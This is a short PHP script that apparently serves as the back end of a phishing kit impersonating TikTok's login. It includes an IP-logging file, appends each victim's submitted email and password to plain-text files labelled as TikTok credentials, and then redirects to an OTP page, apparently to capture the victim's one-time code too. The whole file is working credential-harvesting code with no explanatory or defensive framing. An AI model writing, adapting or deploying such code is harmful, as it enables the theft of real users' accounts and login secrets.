<?php
include 'ip.php';
file_put_contents("usernames.txt", "Tiktok Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Tiktok Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
